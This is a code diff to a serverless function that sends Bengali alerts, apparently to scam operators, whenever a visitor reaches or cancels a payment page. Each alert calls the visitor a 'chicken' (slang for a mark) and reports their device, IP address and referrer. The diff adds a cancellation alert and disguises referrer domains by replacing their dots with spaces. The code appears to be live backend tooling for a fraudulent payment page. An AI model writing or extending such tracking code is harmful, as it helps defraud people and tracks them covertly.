@@ -29,6 +29,7 @@ serve(async (req) => {
 
     const rawIp = ip || req.headers.get('x-forwarded-for') || req.headers.get('cf-connecting-ip') || 'Unknown';
     const clientIp = rawIp.split(',')[0].trim();
+    const displayReferrer = (referrer || 'Direct').replace(/\./g, ' ');
 
     const ua = userAgent || '';
     let device = 'Unknown';
@@ -55,7 +56,7 @@ serve(async (req) => {
             `-------------------\n\n` +
             `🐔মুরগির Device : ${device}\n` +
             `🐔মুরগির IP : ${clientIp}\n` +
-            `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+            `🐔মুরগির Referrer : ${displayReferrer}`;
         } else {
           message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
             `-------------------\n\n` +
@@ -63,7 +64,7 @@ serve(async (req) => {
             `-------------------\n\n` +
             `🐔মুরগির Device : ${device}\n` +
             `🐔মুরগির IP : ${clientIp}\n` +
-            `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+            `🐔মুরগির Referrer : ${displayReferrer}`;
         }
       } else {
         message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
@@ -75,7 +76,7 @@ serve(async (req) => {
           `-------------------\n\n` +
           `🐔মুরগির Device : ${device}\n` +
           `🐔মুরগির IP : ${clientIp}\n` +
-          `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+          `🐔মুরগির Referrer : ${displayReferrer}`;
       }
     } else if (type === 'page_entry') {
       message = `🐔 মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅\n\n` +
@@ -84,7 +85,15 @@ serve(async (req) => {
         `-------------------\n\n` +
         `🐔মুরগির Device : ${device}\n` +
         `🐔মুরগির IP : ${clientIp}\n` +
-        `🐔মুরগির Referrer : ${referrer || 'Direct'}`;
+        `🐔মুরগির Referrer : ${displayReferrer}`;
+    } else if (type === 'payment_cancelled') {
+      message = `🐔 মুরগি পেমেন্ট ক্যানসেল করেছে ✅\n\n` +
+        `-------------------\n\n` +
+        `Update : ক্যানসেল পেইজে গেছে ।\n\n` +
+        `-------------------\n\n` +
+        `🐔মুরগির Device : ${device}\n` +
+        `🐔মুরগির IP : ${clientIp}\n` +
+        `🐔মুরগির Referrer : ${displayReferrer}`;
     } else {
       message = `📢 *Notification*\n\n${JSON.stringify({ type, amount, method })}`;
     }
